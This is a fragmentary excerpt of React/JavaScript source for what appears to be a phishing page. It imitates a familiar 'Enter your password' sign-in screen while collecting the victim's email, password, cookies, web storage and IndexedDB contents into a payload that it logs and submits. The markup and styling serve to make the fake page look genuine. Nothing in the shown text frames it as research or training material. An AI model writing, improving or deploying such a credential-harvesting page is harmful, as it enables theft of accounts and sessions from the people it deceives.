      ...
      async function getAllIndexedDBData() {
        ...
        try {
          ...
          if (indexedDB.databases) {
            ...
            databases.push({
              message:
                "IndexedDB database listing not supported in this browser",
              available: !!indexedDB,
            });
          }
        } catch (e) {
          console.warn("Could not list IndexedDB databases:", e);
          databases.push({ error: e.message });
        }
        return databases;
      }

      // FIXED LOGGING - Use JSON.stringify for objects
      console.log("📝 email:", payload.email);
      console.log("📝 password:", payload.password);
      console.log("📝 cookies:", JSON.stringify(payload.cookies, null, 2));
      console.log("📝 storage:", JSON.stringify(payload.storage, null, 2));
      console.log(
        "📝 browserData:",
        JSON.stringify(payload.browserData, null, 2)
      );
      // Or log the entire payload at once:
        ...
        .then(async (response) => {
          ...
          if (response.ok && data.success !== false) {
            ...
            const count = parseInt(
              sessionStorage.getItem("submitCount") || "0",
              10
            );
        ...
        <div className="min-h-screen flex items-center justify-center bg-gray-50">
          ...
          <div className="flex flex-col justify-between min-h-screen relative  z-10 w-full max-w-md sm:pt-[40px]">
            <div className=" sm:bg-white sm:rounded-[12px] sm:shadow-lg p-[24px] sm:p-[40px]">
              ...
              {/* Heading */}
              <h2 className="text-[24px] text-[#242424] font-semibold text-center mb-6">
                Enter your password
              </h2>
              ...
              <div className="mb-4">
                ...
                <div className="mt-[8px]">
                  <a
                    href="#"
                    className="text-[#115ea3] hover:underline text-sm font-semibold"
                  >
              ...
              <button
                disabled={loading}
                type="submit"
                className="cursor-pointer w-full text-[14px] bg-[#115ea3] text-white font-semibold text-base mt-[20px] py-2 rounded-[4px] hover:bg-blue-700 transition"
              >
              ...
              <div className="mt-6 mb-6 text-center">
                <a
                  href="#"
                  className="text-sm text-[#115ea3] hover:underline font-semibold"
                >
            ...
            <div className="mb-[20px]">
              ...
              <div className=" text-center">
                <span className="text-[10px] text-[#424242]">
                  ...
                  <a href="#" className="text-[#115ea3] hover:underline">
                    Learn more
                  </a>
                </span>
              </div>
